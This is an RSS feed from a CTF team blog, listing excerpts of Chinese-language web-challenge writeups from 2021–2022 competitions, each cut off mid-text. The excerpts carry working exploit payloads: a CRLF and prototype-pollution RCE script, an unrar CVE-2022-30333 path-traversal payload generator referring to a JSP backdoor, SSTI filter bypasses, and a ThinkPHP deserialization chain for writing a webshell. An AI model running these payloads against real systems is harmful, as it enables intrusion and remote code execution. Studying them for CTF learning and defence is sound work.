<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Web on or4nge</title>
    <link>https://or4ngesec.github.io/tags/web/</link>
    <description>Recent content in Web on or4nge</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 07 Nov 2022 19:00:00 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>西湖论剑 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/</link>
      <pubDate>Mon, 07 Nov 2022 19:00:00 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/</guid>
      <description>Web 扭转乾坤 apache层面的waf说content-type不能是multipart/form-data,结合题目描述利用tomcat和apache对content-type理解差异性大小写绕过后随意上传文件即可获取flag。 real_ez_node CRLF注入+原型链污染+ejs模板注入
import requests import urllib url = &amp;#34;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/&amp;#34; payload = &amp;#39;&amp;#39;&amp;#39; HTTP/1.1 POST /copy HTTP/1.1 Host: 127.0.0.1 Content-Length: 159 Content-Type: application/json {&amp;#34;constructor.prototype.outputFunctionName&amp;#34;:&amp;#34;__tmp1; return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /flag.txt&amp;#39;);var __tmp2&amp;#34;} GET / HTTP/1.1 test:&amp;#39;&amp;#39;&amp;#39;.replace(&amp;#39;\n&amp;#39;,&amp;#39;\r\n&amp;#39;) def payload_encode(raw): ret = u&amp;#34;&amp;#34; for i in raw: ret += chr(0x0100+ord(i)) return ret payload = payload_encode(payload) print(payload) r = requests.get(url + &amp;#34;curl?q=&amp;#34; + urllib.parse.quote(payload)) print(r.text) 访问首页即可下载flag文件。 real world git 忘记密码的逻辑中，生成的验证码只跟邮箱和时间戳有关系，没有引入随机数，本地跑一下就能跑出来，然后利用这个验证码重置root@codefever.cn的密码，再登录就可以看到flag了。
&amp;lt;?php // this function use to generated uuid namespace service\Utility; define(&amp;#39;TOTP_SALT&amp;#39;, &amp;#39;codefever-salt&amp;#39;); class TOTP { const SALT = &amp;#39;codefever_salt&amp;#39;; const TOTP_REFRESH_INTERVAL = 30; const TOTP_CHECK_WINDOW_MIN = -10; const TOTP_CHECK_WINDOW_MAX = 10; const PASSWORD_LENGTH = 6; static private function hashInput (string $input) { $salt = self::SALT; if (TOTP_SALT) { $salt = TOTP_SALT; } $input = $input ?</description>
    </item>
    
    <item>
      <title>2022网鼎杯初赛 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/wdb2022-writeup-by-or4nge/</link>
      <pubDate>Wed, 31 Aug 2022 11:45:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/wdb2022-writeup-by-or4nge/</guid>
      <description>Web web669 审源码，发现存在路径穿越（双写绕过过滤）； 读/etc/hosts，找到secret-key为engine-1，用flask-session-manager跑出来管理员的session 文件上传unrar任意写漏洞（CVE-2022-30333），ruby脚本跑一下，上传。注意md5值。
require &amp;#39;zlib&amp;#39; if ARGV.length != 2 $stderr.puts &amp;#34;Usage: ruby ./create-payload &amp;lt;../../target/file&amp;gt; &amp;lt;filename to read payload from&amp;gt;&amp;#34; $stderr.puts $stderr.puts &amp;#34;Eg: $ ruby ./create-payload.rb &amp;#39;../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/backdoor.jsp&amp;#39; ./reverse-tcp-4444.jsp&amp;#34; exit end SYMLINK_LENGTH = 0x68 PAYLOAD_SYMLINK = (ARGV[0] + &amp;#34;\0&amp;#34;).ljust(SYMLINK_LENGTH, &amp;#34;\0&amp;#34;).gsub(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;) if PAYLOAD_SYMLINK.length != SYMLINK_LENGTH $stderr.puts &amp;#34;Payload symlink is invalid, probably too long!&amp;#34; exit end PAYLOAD_LENGTH = 0x1000 PAYLOAD_DATA = File.read(ARGV[1]).ljust(4096, &amp;#34;\0&amp;#34;) if PAYLOAD_DATA.length != PAYLOAD_LENGTH $stderr.puts &amp;#34;Payload data is invalid, probably too long!</description>
    </item>
    
    <item>
      <title>HGAME2022 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/</link>
      <pubDate>Fri, 25 Feb 2022 22:32:31 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/</guid>
      <description>week1 [Web]Fujiwara Tofu Shop By SSGSS
一个个改请求头就 ok
GET / HTTP/1.1 Host: game.summ3r.top User-Agent: Hachi-Roku Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Gasoline: 100 Cookie: flavor=Raspberry; Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Referer: qiumingshan.net X-Real-IP: 127.0.0.1 [Web]Tetris plus By SSGSS
一个个翻 js，长度最长的那个用 js 运行一下就是 flag
[Web]蛛蛛&amp;hellip;嘿嘿♥我的蛛蛛 By SSGSS
爬虫题
import requests import re url = &amp;#39;https://hgame-spider.vidar.club/b7412bb0b0&amp;#39; now = &amp;#39;?key=M7H8z1oG%2B1SaPudvsDf7GEm%2F9hyalx2liQ6X2mBSz4iXDqmZwkyLTWPY02GWc5OZf%2F9zO73pRTg3XdoyjfgY3g%3D%3D&amp;#39; while True: r = requests.get(url + now) try: now = re.search(r&amp;#39;\?key=.*?&amp;#34;&amp;#39;, r.</description>
    </item>
    
    <item>
      <title>长安战“疫” Writeup</title>
      <link>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</link>
      <pubDate>Thu, 13 Jan 2022 13:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</guid>
      <description>Web RCE_No_Para 无参数RCE，且过滤了部分函数。
最终payload：
?a=cat flag.php;&amp;amp;code=system(current(current(get_defined_vars()))); flask 查看网页源码
&amp;lt;!--if not request.full_path.endswith(&amp;#34;.js?&amp;#34;): if not request.full_path.startswith(&amp;#34;/login&amp;#34;): return redirect(&amp;#34;login&amp;#34;)--&amp;gt; 要求路径是以/login开头，以.js?结尾，
查看 flask 文档
Requested path, including the query string.
所以构造路径：
/login/../admin?a=.js? 然后源码提示：
&amp;lt;!--admin/?name=--&amp;gt; 使用以下路径发现是ssti
/login/../admin?name={{7*7}}&amp;amp;a=.js? fuzz发现过滤了__，builtins，所以绕，最终payload
/login/../admin?name={{config|attr(&amp;#39;_&amp;#39;+&amp;#39;_init_&amp;#39;+&amp;#39;_&amp;#39;)|attr(&amp;#39;_&amp;#39;+&amp;#39;_globals_&amp;#39;+&amp;#39;_&amp;#39;)|attr(&amp;#39;_&amp;#39;+&amp;#39;_getitem_&amp;#39;+&amp;#39;_&amp;#39;)(&amp;#39;_&amp;#39;+&amp;#39;_buil&amp;#39;+&amp;#39;tins_&amp;#39;+&amp;#39;_&amp;#39;)|attr(&amp;#39;_&amp;#39;+&amp;#39;_getitem_&amp;#39;+&amp;#39;_&amp;#39;)(&amp;#39;eval&amp;#39;)(&amp;#39;_&amp;#39;+&amp;#39;_import_&amp;#39;+&amp;#39;_(&amp;#34;os&amp;#34;).popen(&amp;#34;cat /flag&amp;#34;).read()&amp;#39;)}}&amp;amp;a=.js? tp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell
生成phar文件
&amp;lt;?php namespace think\process\pipes; class Windows { private $files = []; public function __construct() { $this-&amp;gt;files = [new \think\model\Merge]; } } namespace think\model; use think\Model; class Merge extends Model { protected $append = []; protected $error; public function __construct() { $this-&amp;gt;append = [ &amp;#39;bb&amp;#39; =&amp;gt; &amp;#39;getError&amp;#39; ]; $this-&amp;gt;error = (new \think\model\relation\BelongsTo); } } namespace think; class Model{} namespace think\console; class Output { protected $styles = []; private $handle = null; public function __construct() { $this-&amp;gt;styles = [&amp;#39;removeWhereField&amp;#39;]; $this-&amp;gt;handle = (new \think\session\driver\Memcache); } } namespace think\model\relation; class BelongsTo { protected $query; public function __construct() { $this-&amp;gt;query = (new \think\console\Output); } } namespace think\session\driver; class Memcache { protected $handler = null; public function __construct() { $this-&amp;gt;handler = (new \think\cache\driver\Memcached); } } namespace think\cache\driver; class File { protected $tag; protected $options = []; public function __construct() { $this-&amp;gt;tag = false; $this-&amp;gt;options = [ &amp;#39;expire&amp;#39; =&amp;gt; 3600, &amp;#39;cache_subdir&amp;#39; =&amp;gt; false, &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;data_compress&amp;#39; =&amp;gt; false, &amp;#39;path&amp;#39; =&amp;gt; &amp;#39;php://filter/convert.</description>
    </item>
    
    <item>
      <title>2021暗泉杯 Writeup</title>
      <link>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</link>
      <pubDate>Mon, 06 Dec 2021 19:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</guid>
      <description>* 开头题目表示赛后补题
Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
[萌]odd_upload 题目描述：目录结构与官方项目example相同
所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
flag{1ae85554-c785-4321-8d77-0f68974929f8}
easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&amp;rsquo;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
import requests url = &amp;#34;http://47.</description>
    </item>
    
  </channel>
</rss>
